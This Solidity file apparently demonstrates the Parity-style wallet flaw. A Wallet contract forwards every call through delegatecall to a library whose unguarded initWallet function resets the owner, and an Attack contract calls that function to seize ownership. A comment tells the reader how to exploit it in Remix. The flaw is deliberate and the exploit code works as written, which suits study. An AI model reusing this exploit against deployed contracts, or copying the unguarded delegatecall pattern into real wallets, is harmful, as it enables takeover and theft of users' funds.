contract WalletLibrary {
    address owner;

    function WalletLibrary(){
        initWallet(msg.sender);
    }

    // called by constructor
    function initWallet(address _owner) {
        owner = _owner;
        // ... more setup ...
    }

    function changeOwner(address _new_owner) external {
        if (msg.sender == owner) {
            owner = _new_owner;
        }
    }

    function() payable {
        // ... receive money, log events, ...
    }

    function withdraw(uint amount) external returns (bool success) {
        if (msg.sender == owner) {
            return owner.send(amount);
        } else {
            return false;
        }
    }

}

contract Wallet {
    address public   owner;
    address public _walletLibrary;
    mapping(address => uint256) balance;

    function Wallet(address _ad) {
        // replace the following line with “_walletLibrary = new WalletLibrary();”
        // if you want to try to exploit this contract in Remix.
        owner = msg.sender;
        _walletLibrary = _ad;
    }

    function withdraw(uint amount) returns (bool success) {
        return _walletLibrary.delegatecall(bytes4(sha3("withdraw(uint)")), amount);
    }

    // fallback function gets called if no other function matches call
    function() payable {
        _walletLibrary.delegatecall(msg.data);
    }


}

contract Attack {
    address Wallet;

    function Attack(address addr){
        Wallet = addr;
    }

    function() payable {
        Wallet.call(bytes4(sha3("initWallet(address)")), msg.sender);
    }
}

